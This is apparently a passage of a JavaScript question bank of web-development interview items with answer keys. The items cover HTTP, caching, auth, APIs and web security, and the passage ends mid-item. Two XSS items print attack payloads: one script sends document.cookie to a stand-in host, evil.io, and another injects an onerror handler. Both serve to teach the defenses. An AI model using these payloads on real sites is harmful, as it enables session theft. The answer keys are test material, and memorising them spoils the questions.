window.QUESTION_BANKS = window.QUESTION_BANKS || {};
window.QUESTION_BANKS["interview-web"] = [
  {
    id: "intw-001",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "Your frontend sends `fetch(\"/api/users\", { method: \"POST\", body: JSON.stringify(user) })` and the server receives the request but fails to parse the body. Which header is most likely missing?",
    code: null,
    options: {
      a: "`Accept: application/json` — it tells the server to parse the request body as JSON",
      b: "`Content-Type: application/json` — it tells the server how to interpret the request body",
      c: "`Authorization` — without it the server refuses to read the body",
      d: "`Content-Length` — fetch never sets it, so the server cannot tell where the body ends"
    },
    answer: "b",
    solution: "Correct: b. `Content-Type` describes the format of the body you are SENDING. When you pass a plain string to fetch, it defaults to `text/plain`, so JSON body parsers on the server skip or reject it. Add `headers: { \"Content-Type\": \"application/json\" }`.\n\nWhy the others are wrong:\n- a: `Accept` tells the server what format you want back in the RESPONSE; it says nothing about the request body.\n- c: `Authorization` carries credentials; missing auth gives 401, not a parse failure.\n- d: fetch computes and sets `Content-Length` automatically for string bodies."
  },
  {
    id: "intw-002",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "A user on a 1 Gbps fiber connection complains that your app still feels slow. Explain the difference between latency and bandwidth, and why a fat pipe does not guarantee a fast app.",
    code: null,
    options: null,
    answer: null,
    solution: "Bandwidth is capacity: how much data can move per second. Latency is delay: how long one round trip between client and server takes, usually measured as RTT in milliseconds. They are independent — a connection can be very wide but still far away. Loading an app involves many sequential round trips: DNS lookup, TCP handshake, TLS handshake, the HTTP request itself, then more requests for scripts, styles, and API calls that depend on each other. Each of those trips pays the full latency cost no matter how big the pipe is, and most API responses are tiny, so they are latency-bound, not bandwidth-bound. A good analogy: bandwidth is the number of lanes on a highway, latency is the length of the road — adding lanes does not shorten the drive. To fix a latency problem you move content closer (CDN, edge caching), make fewer round trips (bundling, HTTP/2 multiplexing, batching API calls), or cache so the trip never happens.\n\nInterview tip: ending with one concrete fix like \"that is why we put static assets on a CDN\" shows you have applied this, not just memorized it."
  },
  {
    id: "intw-003",
    category: "interview",
    difficulty: "basic",
    type: "code",
    question: "This raw HTTP request hits your Express server, which uses `express.json()` for body parsing, and the handler responds `400 Bad Request`. Looking only at the dump, what is wrong?",
    code: "POST /api/login HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nContent-Length: 29\n\nemail=sam%40mail.com&pass=123",
    options: null,
    answer: null,
    solution: "Answer: the `Content-Type` header claims the body is JSON, but the body is actually URL-encoded form data (`key=value&key=value`). The JSON parser tries to parse `email=sam%40mail.com&pass=123` as JSON and fails, so the server returns 400.\n\nAnatomy refresher: line 1 is the request line (method, path, HTTP version), then headers as `Name: value` pairs, then one blank line, then the body. The blank line is what separates headers from body.\n\nTwo valid fixes: (1) make the client send a real JSON body like {\"email\":\"sam@mail.com\",\"pass\":\"123\"}, or (2) change the header to `application/x-www-form-urlencoded` and add `express.urlencoded()` on the server. The header and the body format must agree — the server trusts the header to pick a parser."
  },
  {
    id: "intw-004",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "Your company rebrands and moves permanently from `old-site.com` to `new-site.com`. Which redirect should the old domain return, and why does the choice matter?",
    code: null,
    options: {
      a: "301 — browsers cache it and search engines treat it as permanent, transferring ranking signals to the new URL",
      b: "302 — it is the safer default because browsers never cache redirects",
      c: "301 — it forces every client to clear its cached pages for the old domain",
      d: "302 — it tells search engines to index the new URL in place of the old one"
    },
    answer: "a",
    solution: "Correct: a. 301 Moved Permanently is the signal for \"this resource lives at the new URL forever\": browsers cache the redirect and skip the old URL next time, and search engines move indexing and most ranking value to the new address.\n\nWhy the others are wrong:\n- b: 302 means temporary; browsers may cache 302s less aggressively but the real issue is semantics — search engines keep the OLD URL indexed.\n- c: 301 does not clear anything; in fact it gets cached hard, which is why a mistaken 301 is painful to undo. Use 302 first if you are unsure.\n- d: that describes 301 behavior, not 302 — with a 302 search engines assume the move is temporary and keep the old URL."
  },
  {
    id: "intw-005",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "In plain terms, what is the difference between authentication and authorization? And when a site offers \"Log in with Google\", what problem is OAuth actually solving?",
    code: null,
    options: null,
    answer: null,
    solution: "Authentication answers \"who are you?\" — verifying identity with a password, passkey, or a trusted third party. Authorization answers \"what are you allowed to do?\" — checking permissions after identity is known. They always happen in that order: you cannot decide what someone may do before you know who they are. OAuth is, strictly speaking, an authorization and delegation protocol: it lets an app act on your behalf at another service — for example, read your Google profile — without ever seeing your Google password. The app redirects you to Google, you consent to specific scopes, and the app receives a limited access token instead of your credentials. \"Log in with Google\" works because OpenID Connect, a thin identity layer on top of OAuth, adds an ID token that proves who you are. The big wins are that the third-party app never handles your password, the token has limited scope, and Google can revoke it independently.\n\nInterview tip: saying \"OAuth is delegated authorization, and OpenID Connect adds the login part\" is a one-liner that separates you from candidates who call OAuth an authentication protocol."
  },
  {
    id: "intw-006",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "The product list has NOT changed on the server since the first request. What status code and body does the second request receive, and why is this flow faster than a normal fetch?",
    code: "GET /api/products HTTP/1.1\nHost: shop.example.com\n\nHTTP/1.1 200 OK\nETag: \"v42\"\nCache-Control: max-age=0, must-revalidate\n\n[ ...2 KB JSON body... ]\n\nGET /api/products HTTP/1.1\nHost: shop.example.com\nIf-None-Match: \"v42\"",
    options: null,
    answer: null,
    solution: "Answer: `304 Not Modified` with an EMPTY body — and the browser then serves the 2 KB JSON from its own cache.\n\nHow it works: the `ETag` is a fingerprint of the response version (here \"v42\"). Because `Cache-Control: max-age=0, must-revalidate` marks the cached copy as immediately stale, the browser must check back before reusing it — but it checks cheaply by sending `If-None-Match: \"v42\"`. The server compares fingerprints: they match, so instead of re-sending the payload it answers 304 with no body. You pay one small round trip but skip the transfer entirely, which matters a lot for large responses or slow links. If the data HAD changed, the server would reply `200 OK` with the fresh body and a new ETag, and the cycle repeats. This conditional-request flow is the backbone of HTTP revalidation."
  },
  {
    id: "intw-007",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "What is the main way a CDN like Cloudflare or CloudFront speeds up your site?",
    code: null,
    options: {
      a: "It compiles your JavaScript ahead of time so browsers parse it faster",
      b: "It increases your origin server's bandwidth by load-balancing requests across regions",
      c: "It caches copies of your assets on edge servers geographically close to users, cutting round-trip latency",
      d: "It upgrades all traffic to HTTPS, which is inherently faster than HTTP"
    },
    answer: "c",
    solution: "Correct: c. A CDN is a network of edge servers around the world. Static assets (images, CSS, JS, fonts — and increasingly cached API responses) are stored at the edge, so a user in Tokyo gets the file from a Tokyo edge node instead of your origin in Virginia. Shorter distance means lower latency per round trip, and the origin is shielded from most traffic.\n\nWhy the others are wrong:\n- a: CDNs deliver bytes; they do not compile or transform your JavaScript.\n- b: spreading load is a side benefit (origin shielding), but the headline win is proximity, not raw bandwidth.\n- d: HTTPS adds a handshake; it is not faster by itself (HTTP/2 and HTTP/3, which require or pair with TLS, are a different story)."
  },
  {
    id: "intw-008",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "Compare cookie-based server sessions with token-based auth. What are the tradeoffs, and when would you pick each?",
    code: null,
    options: null,
    answer: null,
    solution: "With server sessions, login creates a record on the server (memory, Redis, or a DB) and the browser gets a cookie holding only an opaque session ID; every request looks that ID up. With token-based auth like JWTs, the server signs a self-contained token holding the user's claims, and the client sends it on each request; the server just verifies the signature — no lookup. Sessions give you instant revocation (delete the server record and the user is logged out) and tiny cookies, but they are stateful: to scale horizontally you need a shared session store or sticky sessions. Tokens are stateless and travel well across multiple APIs, microservices, and mobile clients, but revocation is hard — a stolen token is valid until it expires — so you keep them short-lived and pair them with refresh tokens, which quietly reintroduces some state. Also remember a JWT payload is only base64-encoded, not encrypted, so never put secrets in it. A sensible default: cookie sessions for a classic server-rendered web app with one backend; tokens for SPAs or mobile apps talking to multiple distributed services.\n\nInterview tip: mentioning the revocation tradeoff is usually the thing the interviewer is fishing for."
  },
  {
    id: "intw-009",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "You deploy a new version behind nginx. During the deploy users briefly see `502 Bad Gateway`, then a minute later some see `503 Service Unavailable`. What is the actual difference between these codes?",
    code: null,
    options: {
      a: "Both mean nginx itself crashed; which number you get depends on the nginx version",
      b: "502 means the client sent a malformed request through the proxy; 503 means the server is at fault",
      c: "502 means nginx ran out of worker connections; 503 means the app threw an unhandled exception",
      d: "502 means the gateway got no valid response from the app behind it; 503 means the service is temporarily unable to serve, often deliberately"
    },
    answer: "d",
    solution: "Correct: d. 502 Bad Gateway is the proxy saying \"I tried to talk to the app behind me and got nothing usable\" — classic during a deploy when the old process is killed before the new one listens. 503 Service Unavailable means \"the service exists but cannot serve right now\" — maintenance mode, an overloaded server shedding load, or a health check intentionally failing; well-behaved servers add `Retry-After`. For contrast, 500 is the app itself crashing while handling your request.\n\nWhy the others are wrong:\n- a: if nginx itself were dead you would get a connection error, not a status code; the number is semantic, not version-dependent.\n- b: malformed client requests are 4xx territory (400); both 502 and 503 are server-side.\n- c: those specific causes are not what distinguishes the codes — 502 is about a bad upstream response, 503 about temporary unavailability."
  },
  {
    id: "intw-010",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "A pentester emails your users a link to `/search?q=<script>fetch('//evil.io?c='+document.cookie)</script>`. What attack is this, which sub-type is it, and how do you fix the handler?",
    code: "// Express search endpoint\napp.get(\"/search\", (req, res) => {\n  const q = req.query.q;\n  res.send(\"<h1>Results for \" + q + \"</h1>\" +\n           \"<div id=\\\"results\\\"></div>\");\n});",
    options: null,
    answer: null,
    solution: "Answer: reflected cross-site scripting (XSS). The handler takes attacker-controlled input (`req.query.q`) and writes it into the HTML response without escaping, so the `<script>` in the URL executes in the victim's browser under YOUR origin and can steal cookies or act as the user.\n\nSub-types: REFLECTED XSS bounces the payload straight off a request like this one — the victim must click a crafted link. STORED XSS is worse: the payload is saved (e.g., in a comment) and runs for every visitor. DOM-based XSS never touches the server — client-side JS writes a tainted value into a dangerous sink like `innerHTML`.\n\nFixes, in order of importance: (1) escape output — HTML-encode `q` so `<` becomes `&lt;` (template engines like EJS with `<%= %>` or React JSX do this by default; never concatenate raw input into HTML); (2) add a Content-Security-Policy that disallows inline scripts, as a second layer; (3) mark session cookies `HttpOnly` so even a successful XSS cannot read them. Interviewers grade XSS answers on naming the defenses, not describing the attack."
  },
  {
    id: "intw-011",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "Your team is starting a new mobile app backend and a teammate proposes GraphQL instead of REST. How would you compare the two, and what would make you pick one over the other?",
    code: null,
    options: null,
    answer: null,
    solution: "REST models the API as resources at multiple URLs using HTTP verbs, and each endpoint returns a fixed shape. That fixed shape causes over-fetching (you get fields you do not need) and under-fetching (one screen needs three sequential calls). GraphQL exposes a single endpoint where the client sends a query naming exactly the fields it wants, so one round trip can assemble a whole screen — a real win on mobile where latency and payload size hurt. The tradeoffs: REST gets HTTP caching almost for free (GETs, ETags, CDNs cache by URL), is simpler to build and debug, and status codes map cleanly; GraphQL responses are POSTs to one URL, so HTTP-level caching mostly stops working, every query returns 200 even on errors, and the server needs protection against expensive queries (depth limits, cost analysis, N+1 dataloaders). My rule of thumb: REST for public APIs, simple CRUD services, or anything cache-heavy; GraphQL when many different clients need different slices of a rich data graph and you can afford the server-side complexity.\n\nInterview tip: name over-fetching AND the caching tradeoff — most candidates only mention the first."
  },
  {
    id: "intw-012",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "A user clicks \"Pay\", the request times out, and the client never learns whether the charge succeeded. What API design lets the client retry safely without risking a double charge?",
    code: null,
    options: {
      a: "Switch the endpoint from POST to PUT, since PUT is idempotent by definition",
      b: "Have the client send a unique idempotency key with the request; the server remembers it and returns the original result on any retry",
      c: "Return `409 Conflict` on every retry so the client knows to stop retrying",
      d: "Use GET for the payment so the browser can re-issue the request automatically"
    },
    answer: "b",
    solution: "Correct: b. This is the Stripe-style `Idempotency-Key` pattern: the client generates a unique key (e.g., a UUID) per logical payment attempt. The server stores the key with the outcome of the first execution; if the same key arrives again, it does NOT re-run the charge — it replays the stored response. Retries become completely safe even when the client never saw the first answer.\n\nWhy the others are wrong:\n- a: relabeling the method does not deduplicate anything — PUT is only naturally idempotent when the client controls the resource ID and the operation is a full replace, which a \"create a charge\" call is not.\n- c: a blanket 409 does not tell the client whether the money moved — the original uncertainty remains.\n- d: GET must be safe (no side effects); a GET that charges money breaks caches, prefetching, and every HTTP assumption."
  },
  {
    id: "intw-013",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "Users scrolling an active feed report seeing the same posts twice and missing others entirely. The SQL itself is correct. What is the design flaw in this pagination, and what would you use instead?",
    code: "// GET /api/feed?page=3&size=20\napp.get(\"/api/feed\", async (req, res) => {\n  const page = Number(req.query.page);\n  const size = Number(req.query.size);\n  const rows = await db.query(\n    \"SELECT * FROM posts ORDER BY created_at DESC\" +\n    \" LIMIT $1 OFFSET $2\",\n    [size, (page - 1) * size]\n  );\n  res.json(rows);\n});",
    options: null,
    answer: null,
    solution: "Answer: offset/limit pagination over a dataset that changes between requests. New posts are inserted at the top of the feed, which shifts every existing row down — so by the time the client asks for page 3, rows that were on page 2 have slid into page 3 (duplicates) and others have slid past it (gaps). A second problem: `OFFSET 4000` makes the database walk and discard 4000 rows, so deep pages get progressively slower.\n\nFix: cursor-based (keyset) pagination. Instead of a page number, the client sends an opaque cursor identifying the last item it saw, and the query becomes `WHERE (created_at, id) < ($cursor_ts, $cursor_id) ORDER BY created_at DESC, id DESC LIMIT $size`, with the server returning the next cursor alongside the results. Results stay stable while rows are inserted, and the query uses an index seek instead of scanning past skipped rows. Include `id` as a tiebreaker so identical timestamps cannot cause skips. Offset pagination is still fine for small, mostly-static, jump-to-page-N admin tables — that nuance is worth saying out loud.\n\nAlso worth flagging: `size` is unvalidated, so a client can request `size=100000` — always cap page size."
  },
  {
    id: "intw-014",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "You update your domain's `A` record to point at a new server's IP address, but hours later some users are still hitting the old server. Why?",
    code: null,
    options: {
      a: "DNS answers are cached at many layers — browser, OS, router, recursive resolver — each for the record's TTL, so stale answers survive until they expire",
      b: "Browsers keep a TCP connection open to the old IP until the user clears their cookies",
      c: "`A` records only propagate once per day, at midnight UTC",
      d: "You also needed to delete the CNAME record, which always overrides the A record"
    },
    answer: "a",
    solution: "Correct: a. An `A` record maps a hostname to an IPv4 address, and every answer carries a TTL (time to live) in seconds. Each cache along the chain — the browser's DNS cache, the OS, the home router, the ISP's recursive resolver — keeps the old answer until its TTL runs out, and they emptied their caches at different times. The standard migration trick: lower the TTL to something like 60 seconds a day or two BEFORE the switch, flip the record, then raise the TTL again.\n\nWhy the others are wrong:\n- b: cookies have nothing to do with connection reuse or DNS; persistent connections also do not last hours.\n- c: there is no global propagation schedule — \"propagation\" is just caches expiring on their own TTLs.\n- d: a name has either a CNAME or an A record, not a hidden CNAME overriding things; that configuration is invalid at the same name."
  },
  {
    id: "intw-015",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "You are adding live notifications to a web dashboard. Compare short polling, long polling, Server-Sent Events, and WebSockets — which would you choose here and why?",
    code: null,
    options: null,
    answer: null,
    solution: "Short polling: the client asks \"anything new?\" on a fixed interval. Dead simple and works everywhere, but it wastes requests when nothing changed and the average notification delay is half the interval. Long polling: the client sends a request and the server HOLDS it open until there is data or a timeout, then the client immediately re-asks. Much better latency, still one full HTTP request per message plus reconnect overhead. Server-Sent Events: the client opens one long-lived HTTP connection and the server streams text events down it whenever it likes — one direction only, server to client — with automatic reconnection and last-event-id resume built into the browser's EventSource API. WebSockets: a persistent, full-duplex socket upgraded from HTTP; either side can send at any time, which is ideal for chat, games, and collaborative editing, but it is more infrastructure to operate (connection state, scaling, proxies, heartbeats). For one-way notifications, SSE is the sweet spot: real-time delivery, plain HTTP, free reconnection, no protocol upgrade. I would reach for WebSockets only when the client also needs to push messages back over the same channel.\n\nInterview tip: stating the direction of data flow for each option is the fastest way to show you actually understand the differences."
  },
  {
    id: "intw-016",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Two admins open the same product record. Both edit it; the second save would silently overwrite the first admin's changes. Which response and mechanism handles this best?",
    code: null,
    options: {
      a: "`200 OK` — last write wins is the standard REST behavior and admins can coordinate manually",
      b: "`429 Too Many Requests` — the second admin is updating the resource too frequently",
      c: "`409 Conflict` — the server detects the update is based on a stale version (via a version number or `If-Match`/ETag) and rejects it so the client can re-fetch and merge",
      d: "`423 Locked` — HTTP requires locking the row while the first admin has the edit form open"
    },
    answer: "c",
    solution: "Correct: c. This is optimistic concurrency control: each record carries a version (a number or an ETag). The client sends back the version it edited — for example in an `If-Match` header — and the server compares it to the current one. Mismatch means someone saved in between, so the server rejects the write and the client re-fetches, shows a diff, or merges. `409 Conflict` is precisely \"your request conflicts with the current state of the resource\"; it is also the right code for things like duplicate-username registration. Precision point worth mentioning: when the check is done via the HTTP-native `If-Match` precondition, the spec-defined status is `412 Precondition Failed` — `409` is the conventional choice when the version travels in the request body or an application field. Knowing both codes exist is a senior-level detail.\n\nWhy the others are wrong:\n- a: last-write-wins silently destroys data — the exact bug described.\n- b: 429 is rate limiting (too many requests over time), unrelated to data conflicts.\n- d: 423 comes from WebDAV, and pessimistic locks held while a human stares at a form lead to abandoned-lock misery; HTTP requires no such thing."
  },
  {
    id: "intw-017",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "This endpoint must be publicly reachable so the payment provider can call it. What is the security hole, how do providers like Stripe close it, and what is one more reliability concern every webhook consumer has to handle?",
    code: "// Payment provider calls this when a charge completes\napp.post(\"/webhooks/payment\", express.json(),\n  async (req, res) => {\n    const event = req.body;\n    if (event.type === \"charge.succeeded\") {\n      await markOrderPaid(event.orderId);\n    }\n    res.sendStatus(200);\n  });",
    options: null,
    answer: null,
    solution: "Answer: the handler trusts ANY request that reaches the URL. An attacker who discovers or guesses `/webhooks/payment` can POST a fake `{\"type\":\"charge.succeeded\",\"orderId\":...}` and get orders marked paid for free.\n\nFix: verify the webhook signature. Providers sign each delivery — typically an HMAC-SHA256 of the RAW request body using a shared secret, sent in a header like `Stripe-Signature` — and your handler must recompute the HMAC and reject mismatches. Two implementation gotchas: you need the raw body bytes (use `express.raw()` for this route, because `express.json()` re-serialization can change bytes and break the HMAC), and you should check the signed timestamp to block replay attacks of captured deliveries.\n\nReliability concern: providers retry on timeouts and non-2xx responses, so the same event WILL arrive more than once. The handler must be idempotent — store processed event IDs and skip duplicates — and it should respond 2xx quickly, pushing slow work onto a queue, or the retries themselves will pile up. Bonus point: a webhook can arrive out of order, so reconcile against the provider's API for anything money-critical."
  },
  {
    id: "intw-018",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "A non-technical friend says a website must be safe because it shows the padlock. What does HTTPS actually protect, and what does it NOT protect against?",
    code: null,
    options: null,
    answer: null,
    solution: "HTTPS is HTTP run over TLS, and it gives you three things for data in transit. Confidentiality: traffic is encrypted, so someone on the same coffee-shop wifi cannot read your passwords or card numbers. Integrity: the data cannot be silently modified on the way — no ISP injecting ads or attacker swapping a download. Authentication of the SERVER: the certificate, vouched for by a certificate authority, proves you are really talking to the domain in the address bar and not an impostor in the middle. Under the hood the handshake uses asymmetric crypto to verify the certificate and agree on keys, then switches to fast symmetric encryption for the actual data. What the padlock does NOT mean: that the site is honest or safe. Phishing sites get free certificates in minutes, so `secure-paypa1.com` can show a padlock while stealing credentials. HTTPS also does nothing about what happens AFTER transit — the server can store your data badly, the app can have XSS or SQL injection, and an observer can still see WHICH domain you visited even if not the pages. Short version: the padlock means the conversation is private — possibly a private conversation with a criminal.\n\nInterview tip: \"encryption in transit, not a trust badge\" is a tidy closing line."
  },
  {
    id: "intw-019",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Your app uses cookie-based sessions. Which cookie attribute most directly blunts CSRF, and how?",
    code: null,
    options: {
      a: "`HttpOnly` — JavaScript cannot read the cookie, so an attacker cannot forge requests with it",
      b: "`Secure` — the cookie only travels over HTTPS, which a CSRF attack cannot use",
      c: "`Domain` — restricting the domain controls which sites are allowed to send the cookie",
      d: "`SameSite=Lax` (or `Strict`) — the browser stops attaching the cookie to cross-site subrequests and cross-site POSTs, so a forged request from evil.com arrives without a session"
    },
    answer: "d",
    solution: "Correct: d. CSRF works because browsers historically attached cookies to ANY request aimed at your domain, even one triggered from a hostile page — so a hidden form on evil.com could POST `/transfer` and ride the victim's session. `SameSite=Lax` tells the browser not to send the cookie on cross-site subrequests and cross-site POSTs (it still allows top-level GET navigation, which is why state-changing actions must never be GETs); `Strict` withholds it on all cross-site requests. The forged request arrives unauthenticated and fails.\n\nWhy the others are wrong:\n- a: `HttpOnly` defends against XSS cookie THEFT — CSRF never needs to read the cookie, only to make the browser send it.\n- b: CSRF attacks happily target HTTPS sites; `Secure` only blocks plain-HTTP transmission.\n- c: `Domain` controls which HOSTS receive the cookie, not which site initiated the request.\n\nDefense in depth: pair SameSite with anti-CSRF tokens for anything high-value, since older browsers and edge cases exist."
  },
  {
    id: "intw-020",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "No server code ever touches `location.hash`, and your server-side templating escapes everything — yet this page is still exploitable. Name the vulnerability class, sketch a payload, and give two fixes.",
    code: "<!-- profile.html -->\n<div id=\"banner\"></div>\n<script>\n  // Show a welcome message from the URL, e.g. /profile#Sam\n  const name = decodeURIComponent(location.hash.slice(1));\n  document.getElementById(\"banner\").innerHTML =\n    \"Welcome back, \" + name + \"!\";\n</script>",
    options: null,
    answer: null,
    solution: "Answer: DOM-based XSS. The taint flows entirely in the browser — from an attacker-controlled SOURCE (`location.hash`) into a dangerous SINK (`innerHTML`) — so server-side escaping and even a WAF never see it; the fragment after `#` is not even sent to the server.\n\nPayload idea: send the victim `/profile#<img src=x onerror=alert(document.cookie)>`. Note the detail: `<script>` tags inserted via `innerHTML` do NOT execute, but event handlers on injected elements (like `onerror`) DO — that nuance impresses interviewers.\n\nFixes: (1) Use a safe sink — `element.textContent = \"Welcome back, \" + name` renders the input as inert text, which is the right tool since no HTML is needed here. (2) Add a Content-Security-Policy such as `script-src 'self'` with no `unsafe-inline`, which blocks injected inline handlers as a second layer. If you genuinely must render user-supplied HTML, sanitize it with a vetted library like DOMPurify — never with a homemade regex."
  },
  {
    id: "intw-021",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "Your public API needs a breaking change to a response shape that thousands of third-party clients depend on. How do you roll it out without breaking them — and how would you have set up versioning from day one?",
    code: null,
    options: null,
    answer: null,
    solution: "First, decide whether the change is truly breaking. Adding new fields is non-breaking for well-built clients; renaming, removing, or changing the type or meaning of a field is breaking and needs a version boundary. The common versioning schemes: URL path versioning (`/v1/orders`) — explicit, cacheable, trivial to route and test in a browser, which is why it is the most common choice; header versioning (`Accept: application/vnd.myapi.v2+json`) — keeps URLs clean and is arguably more RESTful, but harder to explore and easy for clients to forget; query-param versioning sits in between. Whichever you pick, the rollout pattern is the same: ship v2 alongside v1, never in place of it; announce the deprecation with a clear timeline; advertise it in-band with `Deprecation` and `Sunset` headers so client developers see it in their tooling; monitor per-version, per-consumer usage so you know exactly who is still on v1; reach out to the holdouts; and only shut v1 down after the published date with a long overlap window. From day one, the cheapest insurance is putting `/v1/` in the path even if you never expect a v2, plus designing for additive evolution — tolerant readers, no reuse of field names with new meanings — so most changes never need a new version at all.\n\nInterview tip: the phrase \"versions are a contract, deprecation is a process\" frames the answer well."
  },
  {
    id: "intw-022",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Your API uses a token bucket rate limiter: bucket capacity 10, refill rate 1 token per second. A client that has been idle for a full minute suddenly fires 15 requests at virtually the same instant. What happens?",
    code: null,
    options: {
      a: "The first 10 succeed — the full bucket allows a burst — and the remaining 5 get `429 Too Many Requests`, ideally with a `Retry-After` header",
      b: "All 15 succeed, because a minute of idling banked 60 tokens",
      c: "Only 1 succeeds, because the refill rate is 1 request per second",
      d: "All 15 are rejected — bursts are exactly what rate limiting is designed to prevent"
    },
    answer: "a",
    solution: "Correct: a. In a token bucket, each request spends one token and tokens refill at a steady rate, but the bucket never holds more than its CAPACITY — idle time cannot bank tokens beyond 10. So the burst spends the 10 available tokens, and requests 11 through 15 are rejected with `429 Too Many Requests`. A polite server includes `Retry-After` (or `X-RateLimit-Remaining`/reset headers), and a well-behaved client backs off — ideally exponentially with jitter — instead of hammering.\n\nWhy the others are wrong:\n- b: that would be an unbounded accumulator, not a token bucket; capacity caps the burst.\n- c: refill rate limits the sustained AVERAGE, not the instantaneous burst — confusing the two is the classic token-bucket misunderstanding.\n- d: allowing short bursts while capping the long-run rate is precisely WHY token bucket is chosen over a rigid fixed-rate limiter.\n\nWhy APIs do this at all: protecting shared capacity from runaway clients, containing abuse and scraping, and keeping one noisy tenant from degrading everyone else."
  },
  {
    id: "intw-023",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "A security review flags the `res.cookie(\"sid\", sid)` line. Which three cookie attributes are missing, and which specific attack does each one mitigate?",
    code: "// Login succeeds — set the session cookie\napp.post(\"/login\", async (req, res) => {\n  const user = await verifyLogin(\n    req.body.email, req.body.password);\n  const sid = await createSession(user.id);\n  res.cookie(\"sid\", sid);\n  res.json({ ok: true });\n});",
    options: null,
    answer: null,
    solution: "Answer: the cookie should be set as `res.cookie(\"sid\", sid, { httpOnly: true, secure: true, sameSite: \"lax\", maxAge: ... })`. The three missing protections:\n\n1. `httpOnly: true` — the cookie becomes invisible to JavaScript (`document.cookie` cannot read it). Mitigates session THEFT via XSS: even if an attacker gets a script running on your page, they cannot exfiltrate the session ID.\n\n2. `secure: true` — the browser will only send the cookie over HTTPS. Mitigates network sniffing and downgrade tricks where an attacker lures the browser into making a plain-HTTP request and captures the session in cleartext.\n\n3. `sameSite: \"lax\"` (or `\"strict\"`) — the browser withholds the cookie on cross-site requests. Mitigates CSRF: a forged POST from a hostile site arrives without the session attached.\n\nEach flag maps to a different attack, which is exactly how interviewers want it answered: HttpOnly vs XSS theft, Secure vs eavesdropping, SameSite vs CSRF. Also worth adding an explicit `maxAge` so sessions expire, and note that none of these flags excuses skipping output escaping or CSRF tokens — they are layers, not replacements."
  },
  {
    id: "intw-024",
    category: "interview",
    difficulty: "advanced",
    type: "mcq",
    question: "A teammate sets `Cache-Control: no-cache` on API responses containing private account data, believing this prevents them from being cached anywhere. What is wrong with that belief?",
    code: null,
    options: {
      a: "Nothing — `no-cache` forbids any cache, shared or private, from storing the response",
      b: "`no-cache` only applies to CDNs and proxies; browsers are free to ignore it",
      c: "`no-cache` allows the response to be STORED but requires revalidation with the origin before each reuse; to forbid storage you need `no-store` (and `private` to keep shared caches out)",
      d: "The correct directive is `max-age=0`, which actively deletes the response from every cache along the path"
    },
    answer: "c",
    solution: "Correct: c. Despite the name, `no-cache` means \"you may keep a copy, but you must check with the server (revalidate, e.g., via `If-None-Match`/ETag) before using it again.\" The bytes can still land in browser and proxy cache storage. For sensitive data the right directive is `no-store` — never write this response to any cache — commonly sent as `Cache-Control: no-store` or combined with `private` so shared caches are explicitly excluded. (`private` alone still lets the user's own browser cache it.)\n\nWhy the others are wrong:\n- a: that describes `no-store`, not `no-cache` — the misnaming is the whole trap.\n- b: Cache-Control directives bind all caches, browsers included.\n- d: `max-age=0` just marks the copy stale immediately — it is still stored, and nothing in HTTP \"deletes\" entries from caches along the path.\n\nThis pairing — `no-cache` = store-but-revalidate, `no-store` = never store — is one of the most reliable senior-sounding distinctions a junior can drop in an interview."
  },
  {
    id: "intw-025",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "You integrate a payment provider, and a payment can take several minutes to complete. Would you poll their API for the result or use a webhook? Explain the difference between the two approaches.",
    code: null,
    options: null,
    answer: null,
    solution: "Polling is pull: my server repeatedly calls their API — \"is payment 123 done yet?\" — on some interval. It is simple and keeps all the initiative on my side, but it wastes requests when nothing has changed, it can run into their rate limits, and my average notification delay is half the polling interval, so I am choosing between being slow and being noisy. A webhook is push: I register a URL with the provider, and when the payment completes THEY send an HTTP POST to my endpoint with the event. I learn about it within seconds, with zero wasted calls. The costs of webhooks are operational: I must expose a public endpoint, verify each delivery is genuinely from the provider (signature verification), respond quickly with a 2xx, and handle their retries — which means deduplicating events, since the same one can arrive twice. For a payment flow the standard answer is webhooks for real-time updates, often backed by a periodic reconciliation poll as a safety net in case a webhook delivery is missed.\n\nInterview tip: \"webhooks are push, polling is pull\" plus one security point (verify the signature) is exactly the level of answer expected here."
  },
  {
    id: "intw-026",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "What was the main problem with HTTP/1.1 that HTTP/2 solved?",
    code: null,
    options: {
      a: "HTTP/1.1 could not transmit images or binary data",
      b: "Head-of-line blocking at the connection level: HTTP/1.1 handles one request at a time per connection (forcing browsers to open ~6 parallel connections per host), while HTTP/2 multiplexes many concurrent requests over a single connection",
      c: "HTTP/1.1 had no support for HTTPS",
      d: "HTTP/1.1 limited responses to 1 MB"
    },
    answer: "b",
